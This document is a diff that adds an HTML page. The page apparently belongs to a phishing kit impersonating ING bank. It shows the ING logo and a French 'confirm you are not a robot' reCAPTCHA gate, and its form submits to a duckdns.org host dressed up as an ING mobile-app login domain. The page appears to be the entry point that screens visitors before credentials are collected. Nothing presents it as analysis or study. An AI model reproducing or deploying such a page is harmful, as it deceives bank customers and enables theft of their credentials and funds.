@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  </head>
+  <body>
+    <center>&nbsp;</center>
+    <div style="text-align: center;"><img src="http://www.burodesign.lu/wp-content/uploads/2017/03/ING-logo.png"
+
+        alt="" style="width: 935px; height: 173px;">&nbsp;
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+      <script>
+$(document).ready(function(){
+ $("form").submit(function(){
+   var response = grecaptcha.getResponse();
+      if(response.length == 0){
+          alert('Please check the Captcha');
+    return false;
+ } 
+ });
+});
+</script><script type="text/javascript">
+ var onloadCallback = function() {
+ grecaptcha.render('html_element', {
+ 'sitekey' : '6LeyTo0aAAAAAB9MKPc7OHmndfZN83jK3DpThN1Q'
+ });
+ };
+ </script></div>
+    <h3 align="center">Veuillez confirmer que vous n'êtes pas un robot.</h3>
+    <center>&nbsp;</center>
+    <div align="center">
+      <form action="https://connexion-mobileapp.duckdns.org/ing" method="post">
+        <div id="html_element"></div>
+        <br>
+        <center>&nbsp;</center>
+        <input value="Continuer" type="submit"> </form>
+      <script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit"
+
+async="" defer="defer">
+ </script> </div>
+  </body>
+</html>
